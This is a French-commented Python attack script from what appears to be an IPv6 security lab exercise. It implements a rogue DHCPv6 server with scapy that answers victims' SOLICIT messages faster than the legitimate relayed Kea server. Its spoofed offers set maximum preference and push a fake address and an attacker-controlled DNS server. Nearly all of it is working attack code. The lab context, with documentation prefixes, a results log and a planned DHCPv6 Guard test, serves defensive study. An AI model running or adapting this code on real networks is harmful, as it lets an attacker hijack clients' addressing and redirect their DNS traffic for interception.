#!/usr/bin/env python3
"""
Attaque —> Faux serveur DHCPv6 (fake_dhcpv6.py)

Critère de réussite (CONTRAT.md §6) :
    "Faux DHCPv6 : une victime reçoit la configuration du faux serveur"
    (vérifiable avec `ip -6 addr show dev eth1` et `resolvectl status` ou
    `cat /etc/resolv.conf` CÔTÉ VICTIME : adresse dans notre pool, DNS =
    l'attaquant au lieu de 2001:db8:10:20::53).

Contrairement à fake_ra.py, la détection du succès ici est DIRECTE et pas
une astuce indirecte : le protocole DHCPv6 nous donne la réponse lui-même.
Quand un client a reçu plusieurs ADVERTISE (le vrai et le nôtre), il choisit
UN SEUL serveur et le dit explicitement dans son message REQUEST, via
l'option "Server Identifier" qui recopie le DUID du serveur choisi. Il
suffit donc de regarder si le REQUEST de la victime contient NOTRE DUID
pour savoir, sans ambiguïté, si l'attaque a marché.

Pourquoi on peut gagner la course face au vrai serveur Kea : le vrai
serveur est sur le VLAN 20, ses réponses passent par le relais du routeur
(2 sauts en plus : client -> routeur -> dhcp, puis dhcp -> routeur ->
client, cf. le diagramme RELAY-FORW/RELAY-REPL du rapport de conception).
Nous, l'attaquant, sommes sur le MÊME lien que la victime (VLAN 10) : notre
réponse directe arrive presque toujours avant. On ajoute en plus l'option
"Preference" à 255 (RFC 3315) pour que le client nous accepte immédiatement
sans attendre le délai de collecte des autres offres.

Étapes de l'attaque dans l'ordre (cf. planning) :
  1. (manuel, tshark) observer un échange DHCPv6 normal                 -> fait, voir kea-dhcp6.conf et CONTRAT.md §3
  2. écouter les SOLICIT directement sur le VLAN 10                     -> _callback_dhcp (msgtype Solicit)
  3. répondre par un ADVERTISE falsifié avant le vrai serveur           -> _repondre_advertise
  4. inclure une fausse option DNS (détournement de trafic)             -> --fake-dns (par défaut : l'adresse attaquant du CONTRAT.md §3)
  5. vérifier côté victime quelle configuration a été acceptée          -> détecté automatiquement via le REQUEST (_callback_dhcp, msgtype Request) + vérif manuelle en bonus
  6. tester les contournements (une fois la protection posée)           -> PAS MAINTENANT, après le déploiement de DHCPv6 Guard par les Emna
  7. noter les résultats dans le CSV commun                             -> log_resultat

Usage dans le conteneur attacker (root requis pour les sockets bruts) :

  sudo python3 fake_dhcpv6.py --iface eth1 --phase avant --essai 1 --duree 30

  # Test hors lab, sans rien envoyer :
  python3 fake_dhcpv6.py --iface lo --phase avant --essai 1 --duree 5 --dry-run

Vérification manuelle côté victime (en complément de la détection auto) :
  docker exec clab-ipv6lab-victim1 ip -6 addr show dev eth1
  docker exec clab-ipv6lab-victim1 resolvectl status eth1   # ou: cat /etc/resolv.conf
Restauration après le test :
  docker exec clab-ipv6lab-victim1 dhclient -6 -r eth1 && docker exec clab-ipv6lab-victim1 dhclient -6 -N eth1
"""

import re
import signal
import subprocess
import sys
import threading
import time

from common import base_arg_parser, log_resultat, mesurer_latence_ping

try:
    from scapy.all import Ether, IPv6, UDP, sniff, sendp
    from scapy.layers.dhcp6 import (
        DHCP6_Solicit, DHCP6_Advertise, DHCP6_Request, DHCP6_Reply,
        DHCP6OptClientId, DHCP6OptServerId, DHCP6OptIA_NA, DHCP6OptIAAddress,
        DHCP6OptDNSServers, DHCP6OptDNSDomains, DHCP6OptPref, DUID_EN,
    )
except ImportError:
    sys.exit("[ERREUR] scapy n'est pas installé dans ce conteneur : pip install scapy")

# Notre identifiant de serveur (DUID type EN, comme Kea dans kea-dhcp6.conf,
# qui utilise enterprise-id 32473 et l'identifiant ASCII "LEGIT"). On prend
# un enterprise-id différent et l'identifiant ASCII "FAKE" : ça permet à
# Dora de distinguer tout de suite les deux serveurs dans une capture tshark.
NOTRE_DUID = DUID_EN(enterprisenum=99999, id=b"FAKE")


def obtenir_adresse_link_local(iface):
    """Lit l'adresse link-local (fe80::...) de notre propre interface, pour
    répondre en unicast à la victime (on ne peut pas la coder en dur :
    chaque conteneur attacker peut en avoir une différente après
    redéploiement, cf. lab/README.md "Limites connues").
    """
    r = subprocess.run(["ip", "-6", "-o", "addr", "show", "dev", iface, "scope", "link"],
                        capture_output=True, text=True)
    m = re.search(r"inet6\s+([0-9a-fA-F:]+)/\d+", r.stdout)
    if not m:
        sys.exit(f"[ERREUR] impossible de lire l'adresse link-local de {iface} : {r.stdout}")
    return m.group(1)


class AttaqueFakeDHCPv6:
    """Regroupe l'état de l'attaque. Un seul thread d'écoute suffit ici
    (contrairement à fake_ra.py) : on ne "martèle" rien en continu, on
    réagit seulement quand une victime parle (SOLICIT puis REQUEST).
    """

    def __init__(self, iface, fake_prefix, fake_dns, fake_domaine, dry_run):
        self.iface = iface
        self.fake_prefix = fake_prefix        # ex: 2001:db8:10:10::
        self.fake_dns = fake_dns              # adresse DNS falsifiée (nous, par défaut)
        self.fake_domaine = fake_domaine
        self.dry_run = dry_run
        self.mac_attaquant = subprocess.run(
            ["cat", f"/sys/class/net/{iface}/address"], capture_output=True, text=True
        ).stdout.strip()
        self.ip_attaquant = None if dry_run else obtenir_adresse_link_local(iface)
        self.arret = threading.Event()

        self.solicits_vus = 0
        self.requests_vus = 0
        self.victoires = 0          # nb de REQUEST qui nous ont choisis
        self.pool_suivant = 0x6000  # nos adresses falsifiées commencent à ::6000
        self.clients_connus = {}    # duid (bytes) -> adresse falsifiée déjà proposée

    # ---------- construction des réponses falsifiées ----------

    def _adresse_pour_client(self, duid_bytes):
        """Donne toujours la même fausse adresse à un client qui réessaie
        (évite de lui en attribuer une nouvelle à chaque retransmission de
        son SOLICIT).
        """
        if duid_bytes not in self.clients_connus:
            self.clients_connus[duid_bytes] = f"{self.fake_prefix}{self.pool_suivant:x}"
            self.pool_suivant += 1
        return self.clients_connus[duid_bytes]

    def _construire_options_config(self, client_duid, iaid):
        """Options communes à l'ADVERTISE et au REPLY : l'adresse falsifiée
        dans un IA_NA (même iaid que le client, sinon il ignore l'offre),
        le DNS falsifié (étape 4 du planning : "détournement de trafic"),
        et notre identifiant de serveur avec préférence maximale.
        """
        adresse = self._adresse_pour_client(bytes(client_duid))
        ia_addr = DHCP6OptIAAddress(addr=adresse, preflft=1800, validlft=3600)
        ia_na = DHCP6OptIA_NA(iaid=iaid, T1=0, T2=0, ianaopts=[ia_addr])
        dns = DHCP6OptDNSServers(dnsservers=[self.fake_dns])
        domaine = DHCP6OptDNSDomains(dnsdomains=[self.fake_domaine])
        server_id = DHCP6OptServerId(duid=NOTRE_DUID)
        pref = DHCP6OptPref(prefval=255)  # RFC 3315 : préférence max, le client n'attend pas les autres offres
        return adresse, [server_id, pref, ia_na, dns, domaine]

    def _envoyer(self, msg, client_mac, client_ip, options):
        eth = Ether(src=self.mac_attaquant, dst=client_mac)
        ip6 = IPv6(src=self.ip_attaquant, dst=client_ip)
        udp = UDP(sport=547, dport=546)
        pkt = eth / ip6 / udp / msg
        for opt in options:
            pkt = pkt / opt
        if self.dry_run:
            print(f"[DRY-RUN] {msg.__class__.__name__} qui serait envoyé à {client_ip}")
        else:
            sendp(pkt, iface=self.iface, verbose=False)

    # ---------- réaction aux messages de la victime ----------

    def _callback_dhcp(self, pkt):
        if UDP not in pkt or pkt[UDP].dport != 547:
            return  # on ne regarde que ce qui part VERS un serveur (547), pas les réponses (546)
        if DHCP6OptClientId not in pkt:
            return
        client_duid = pkt[DHCP6OptClientId].duid
        client_mac = pkt[Ether].src
        client_ip = pkt[IPv6].src
        ia_na = pkt[DHCP6OptIA_NA] if DHCP6OptIA_NA in pkt else None
        iaid = ia_na.iaid if ia_na else 0

        if DHCP6_Solicit in pkt:
            self.solicits_vus += 1
            trid = pkt[DHCP6_Solicit].trid
            adresse, options = self._construire_options_config(client_duid, iaid)
            advertise = DHCP6_Advertise(trid=trid) / DHCP6OptClientId(duid=client_duid)
            print(f"[SOLICIT] {client_ip} cherche un serveur -> on propose {adresse} "
                  f"(DNS falsifié {self.fake_dns})")
            self._envoyer(advertise, client_mac, client_ip, options)

        elif DHCP6_Request in pkt:
            self.requests_vus += 1
            # Le client recopie dans son REQUEST le Server Identifier du
            # serveur qu'IL A CHOISI parmi toutes les offres reçues.
            # Si c'est le nôtre -> victoire confirmée, pas une supposition.
            if DHCP6OptServerId in pkt and bytes(pkt[DHCP6OptServerId].duid) == bytes(NOTRE_DUID):
                self.victoires += 1
                trid = pkt[DHCP6_Request].trid
                adresse, options = self._construire_options_config(client_duid, iaid)
                reply = DHCP6_Reply(trid=trid) / DHCP6OptClientId(duid=client_duid)
                print(f"[OK] {client_ip} nous a choisis ! Confirmation avec {adresse}")
                self._envoyer(reply, client_mac, client_ip, options)
            else:
                print(f"[PERDU] {client_ip} a choisi le vrai serveur, pas nous, pour ce tour.")

    def _ecouter(self):
        sniff(
            iface=self.iface, filter="udp port 547",
            prn=self._callback_dhcp,
            stop_filter=lambda p: self.arret.is_set(),
            store=False,
        )

    # ---------- orchestration ----------

    def executer(self, duree_s):
        t = threading.Thread(target=self._ecouter, daemon=True)
        t.start()
        print(f"[*] Faux serveur DHCPv6 en écoute sur {self.iface} pendant {duree_s:.0f}s... "
              f"(DNS falsifié = {self.fake_dns})")
        print("    Ctrl+C pour arrêter proprement avant la fin.")

        def gerer_signal(signum, frame):
            print("\n[!] Arrêt demandé, fin propre de l'attaque...")
            self.arret.set()

        signal.signal(signal.SIGINT, gerer_signal)
        signal.signal(signal.SIGTERM, gerer_signal)

        fin = time.time() + duree_s
        while time.time() < fin and not self.arret.is_set():
            time.sleep(0.5)
        self.arret.set()
        time.sleep(1)


def main():
    parser = base_arg_parser(
        "Faux serveur DHCPv6 (fake_dhcpv6) : répond plus vite que Kea, "
        "avec une fausse option DNS pour montrer le détournement de trafic."
    )
    parser.add_argument("--fake-prefix", default="2001:db8:10:10::",
                         help="Préfixe utilisé pour les adresses falsifiées qu'on propose.")
    parser.add_argument("--fake-dns", default="2001:db8:10:10::66",
                         help="DNS falsifié annoncé aux victimes. Par défaut : l'adresse "
                              "de l'attaquant du CONTRAT.md §3 (2001:db8:10:10::66), pour "
                              "montrer concrètement le détournement de trafic.")
    parser.add_argument("--fake-domaine", default="evil.lab.local",
                         help="Domaine de recherche falsifié (le vrai, chez Kea, est legit.lab.local).")
    args = parser.parse_args()

    attaque = AttaqueFakeDHCPv6(
        iface=args.iface,
        fake_prefix=args.fake_prefix,
        fake_dns=args.fake_dns,
        fake_domaine=args.fake_domaine,
        dry_run=args.dry_run,
    )

    cible_latence = "2001:db8:10:20::10"
    latence_avant = None if args.dry_run else mesurer_latence_ping(cible_latence, args.iface, count=2)

    attaque.executer(args.duree)

    latence_apres = None if args.dry_run else mesurer_latence_ping(cible_latence, args.iface, count=2)
    latence_ms = latence_apres if latence_apres is not None else latence_avant

    succes = attaque.victoires > 0 or args.dry_run
    commentaire = (
        f"solicits_vus={attaque.solicits_vus}, requests_vus={attaque.requests_vus}, "
        f"victoires={attaque.victoires}, fake_dns={args.fake_dns}. "
        f"{args.commentaire}".strip()
    )

    log_resultat(
        attaque="fake_dhcpv6",
        phase=args.phase,
        essai=args.essai,
        succes=succes,
        cache_voisins=None,
        latence_ms=latence_ms,
        faux_positif=False,
        commentaire=commentaire,
    )

    print(f"\n[FIN] solicits_vus={attaque.solicits_vus} requests_vus={attaque.requests_vus} "
          f"victoires={attaque.victoires} succes={succes}")
    print("[RAPPEL] Vérifier aussi CÔTÉ VICTIME avec :")
    print("  docker exec clab-ipv6lab-victim1 ip -6 addr show dev eth1")
    print("  docker exec clab-ipv6lab-victim1 cat /etc/resolv.conf")


if __name__ == "__main__":
    main()
